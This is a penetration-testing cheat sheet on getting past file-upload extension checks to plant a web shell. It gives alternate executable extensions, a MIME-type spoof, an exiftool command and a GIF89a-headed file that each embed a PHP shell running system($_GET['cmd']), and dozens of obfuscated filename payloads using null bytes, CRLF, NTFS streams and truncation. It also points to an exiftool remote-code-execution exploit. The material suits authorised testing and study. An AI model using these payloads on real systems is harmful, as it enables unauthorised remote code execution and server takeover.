## Bypassing File Extension Restrictions  

### Alternate extensions
|Type|Extension|
|---|---|
|php|.phptm, phtml, .shtml, .htaccess, .phar, .php, .php2, .php3, .php4, .php5, .php6, .php7, phps, .pht, and .inc|
|asp|asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, cshtm, .cshtml, .rem, .soap, .vhbtm, .vbhtml, .vbhtml, .asa, .cer, .shtml |
|perl|.pl, .pm, .cgi, .lib|
|jsp|.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action|
|Coldfusion|.cfm, .cfml, .cfc, .dbm|
|flash|.swf|
|Erlang Yaws Web Server| .yaws|

### Mime Types
`Content-type: application/x-php`  
Replace with:  
`Content-type: image/jpeg`

### PHP getimagesize()
For file uploads which validate image size using php getimagesize(), it may be possible to execute shellcode by inserting it into the Comment attribute of Image properties and saving it as file.jpg.php.
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
mv file.jpg file.php.jpg
```
### exiftool
Exiftool versions 7.44-12.23 are vulnerable to remote code execution. [CVE-2021-22204](https://github.com/se162xg/CVE-2021-22204).  There is also a metasploit module available.  [exploit-db](https://www.exploit-db.com/download/49881)

### GIF89a; header
GIF89a is a GIF file header. If uploaded content is being scanned, sometimes the check can be fooled by putting this header item at the top of shellcode:
```
GIF89a;
<?
system($_GET['cmd']); # shellcode goes here
?>
```
### File Extension Obfuscation

* Use camelcase 
     * .pHp
     * .pHpS
* Add valid extensions before the execution extension
     * file.jpg.php
* Add Special Characters to the end
     * file.php%20
     * file.php%0a
     * file.php%00
     * file.php%0d%0a
     * file.php/
     * file.php.\
     * file.
     * file.php....
     * file.pHp5....
* Double extensions or add junk
     * file.png.php
     * file.png.pHp5
     * file.php%00.png
     * file.php\x00.png
     * file.php%0a.png
     * file.php%0d%0a.png
     * file.phpJunk123png
 * Add another layer of extensions to the previous check:
     * file.png.jpg.php
     * file.php%00.png%00.jpg
 * place the exec extension before the valid extension
     * file.php.png
 * Use NTFS Alternate data streams (ADS)
     * file.asp::jpg
     * file.asp::$data
 * Use long filenames to overrun the filename limitation and truncate the valid extension
 ```
 # Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```
